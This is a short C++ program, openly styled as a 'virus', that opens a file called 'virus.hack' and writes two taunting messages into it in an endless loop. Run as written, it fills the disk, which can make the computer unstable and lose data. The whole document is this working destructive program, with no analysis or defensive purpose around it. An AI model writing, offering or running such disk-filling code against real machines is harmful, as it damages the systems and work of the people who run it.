#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

int main()
{
    string i = "  Your system will be crashed within seconds  ";
    string j = "  Catch me if you can  ";
    ofstream virus;
    virus.open("virus.hack");

    while(true){
        virus<<i;
        virus<<j;
    }
    virus.close();
}
